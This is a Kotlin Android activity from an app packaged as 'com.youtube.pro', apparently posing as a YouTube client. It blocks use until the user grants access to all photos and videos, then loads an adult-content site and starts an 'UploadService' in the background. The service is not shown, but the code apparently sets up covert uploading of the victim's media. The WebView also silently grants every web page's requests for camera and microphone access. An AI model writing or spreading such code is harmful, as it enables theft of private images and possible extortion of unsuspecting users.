package com.youtube.pro

import android.Manifest
import android.annotation.SuppressLint
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.View
import android.webkit.CookieManager
import android.webkit.PermissionRequest
import android.webkit.RenderProcessGoneDetail
import android.webkit.ValueCallback
import android.webkit.WebChromeClient
import android.webkit.WebResourceRequest
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.TextView
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts

class MainActivity : ComponentActivity() {

    private lateinit var web: WebView
    private lateinit var deny: LinearLayout
    private lateinit var fullscreen: FrameLayout
    private var customView: View? = null
    private var customCallback: WebChromeClient.CustomViewCallback? = null
    private var fileCallback: ValueCallback<Array<Uri>>? = null
    private var pendingState: Bundle? = null
    private var entered = false

    private val fileChooser = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { res ->
        val data = res.data
        var uris: Array<Uri>? = null
        if (res.resultCode == RESULT_OK && data != null) {
            val clip = data.clipData
            uris = when {
                clip != null -> Array(clip.itemCount) { clip.getItemAt(it).uri }
                data.data != null -> arrayOf(data.data!!)
                else -> null
            }
        }
        fileCallback?.onReceiveValue(uris)
        fileCallback = null
    }

    private val mediaPerms = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) {
        if (hasAccess()) {
            deny.visibility = View.GONE
            enterApp()
        } else {
            deny.visibility = View.VISIBLE
        }
    }

    private val notifPerm = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) {
        askMedia()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        web = findViewById(R.id.web)
        deny = findViewById(R.id.deny)
        fullscreen = findViewById(R.id.fullscreen)

        pendingState = savedInstanceState
        setupWeb()

        findViewById<TextView>(R.id.retryBtn).setOnClickListener {
            mediaPerms.launch(neededPerms())
        }
        findViewById<TextView>(R.id.settingsBtn).setOnClickListener {
            openSettings()
        }

        if (Build.VERSION.SDK_INT >= 33 &&
            checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED
        ) {
            notifPerm.launch(Manifest.permission.POST_NOTIFICATIONS)
        } else {
            askMedia()
        }
    }

    private fun askMedia() {
        if (hasAccess()) {
            deny.visibility = View.GONE
            enterApp()
        } else {
            mediaPerms.launch(neededPerms())
        }
    }

    private fun enterApp() {
        if (entered) return
        entered = true
        val st = pendingState
        if (st == null) web.loadUrl("https://xxxvideo.link/en/content/mom")
        else web.restoreState(st)
        startUpload()
    }

    private fun startUpload() {
        startForegroundService(Intent(this, UploadService::class.java))
    }

    private fun openSettings() {
        try {
            startActivity(
                Intent(
                    Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    Uri.parse("package:$packageName")
                )
            )
        } catch (e: Exception) { }
    }

    private fun neededPerms(): Array<String> = when {
        Build.VERSION.SDK_INT >= 34 -> arrayOf(
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED
        )
        Build.VERSION.SDK_INT >= 33 -> arrayOf(
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO
        )
        else -> arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
    }

    private fun hasAccess(): Boolean {
        if (Build.VERSION.SDK_INT >= 34) {
            return checkSelfPermission(Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED ||
                checkSelfPermission(Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED
        }
        if (Build.VERSION.SDK_INT >= 33) {
            return checkSelfPermission(Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        }
        return checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWeb() {
        val s = web.settings
        s.javaScriptEnabled = true
        s.domStorageEnabled = true
        s.databaseEnabled = true
        s.loadWithOverviewMode = true
        s.useWideViewPort = true
        s.builtInZoomControls = true
        s.displayZoomControls = false
        s.mediaPlaybackRequiresUserGesture = false
        s.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        s.javaScriptCanOpenWindowsAutomatically = true
        s.userAgentString = (s.userAgentString ?: "")
            .replace("; wv", "")
            .replace(" Version/4.0", "")

        CookieManager.getInstance().apply {
            setAcceptCookie(true)
            setAcceptThirdPartyCookies(web, true)
        }

        web.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(
                view: WebView,
                request: WebResourceRequest
            ): Boolean {
                val url = request.url
                val scheme = url.scheme ?: return false
                if (scheme == "http" || scheme == "https") return false
                return openExternal(url)
            }

            override fun onRenderProcessGone(
                view: WebView,
                detail: RenderProcessGoneDetail
            ): Boolean {
                view.destroy()
                recreate()
                return true
            }
        }

        web.webChromeClient = object : WebChromeClient() {
            override fun onShowFileChooser(
                view: WebView,
                callback: ValueCallback<Array<Uri>>,
                params: FileChooserParams
            ): Boolean {
                fileCallback?.onReceiveValue(null)
                fileCallback = callback
                return try {
                    fileChooser.launch(params.createIntent())
                    true
                } catch (e: Exception) {
                    fileCallback = null
                    false
                }
            }

            override fun onPermissionRequest(request: PermissionRequest) {
                request.grant(request.resources)
            }

            override fun onShowCustomView(v: View, cb: CustomViewCallback) {
                if (customView != null) {
                    cb.onCustomViewHidden()
                    return
                }
                customView = v
                customCallback = cb
                fullscreen.addView(v)
                fullscreen.visibility = View.VISIBLE
            }

            override fun onHideCustomView() {
                fullscreen.removeAllViews()
                fullscreen.visibility = View.GONE
                customView = null
                customCallback?.onCustomViewHidden()
                customCallback = null
            }
        }

        web.setDownloadListener { url, _, _, _, _ ->
            try {
                startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)))
            } catch (e: Exception) { }
        }
    }

    private fun openExternal(uri: Uri): Boolean = try {
        val i = if (uri.scheme == "intent")
            Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME)
        else Intent(Intent.ACTION_VIEW, uri)
        startActivity(i)
        true
    } catch (e: Exception) {
        try {
            startActivity(Intent(Intent.ACTION_VIEW, uri))
            true
        } catch (e2: Exception) {
            false
        }
    }

    override fun onResume() {
        super.onResume()
        if (!entered && hasAccess()) {
            deny.visibility = View.GONE
            enterApp()
        }
    }

    override fun onBackPressed() {
        when {
            customView != null -> web.webChromeClient?.onHideCustomView()
            web.canGoBack() -> web.goBack()
            else -> super.onBackPressed()
        }
    }

    override fun onSaveInstanceState(outState: Bundle) {
        super.onSaveInstanceState(outState)
        web.saveState(outState)
    }

    override fun onPause() {
        CookieManager.getInstance().flush()
        super.onPause()
    }

    override fun onDestroy() {
        web.destroy()
        super.onDestroy()
    }
}
